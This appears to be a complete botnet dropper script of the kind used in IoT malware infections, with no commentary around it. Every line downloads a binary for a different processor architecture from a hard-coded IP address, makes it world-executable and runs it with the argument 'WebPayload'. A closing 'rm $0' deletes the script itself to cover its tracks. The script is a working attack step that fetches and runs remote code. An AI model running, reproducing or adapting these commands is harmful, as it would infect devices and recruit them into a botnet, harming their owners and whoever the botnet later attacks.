wget http://194.31.98.104/uwu/arm; chmod 777 arm; ./arm WebPayload
wget http://194.31.98.104/uwu/arm5; chmod 777 arm5; ./arm5 WebPayload
wget http://194.31.98.104/uwu/arm6; chmod 777 arm6; ./arm6 WebPayload
wget http://194.31.98.104/uwu/arm7; chmod 777 arm7; ./arm7 WebPayload
wget http://194.31.98.104/uwu/sh4; chmod 777 sh4; ./sh4 WebPayload
wget http://194.31.98.104/uwu/arc; chmod 777 arc; ./arc WebPayload
wget http://194.31.98.104/uwu/mips; chmod 777 mips; ./mips WebPayload
wget http://194.31.98.104/uwu/mpsl; chmod 777 mpsl; ./mpsl WebPayload
wget http://194.31.98.104/uwu/sparc; chmod 777 sparc; ./sparc WebPayload
wget http://194.31.98.104/uwu/x86; chmod 777 x86; ./x86 WebPayload
rm $0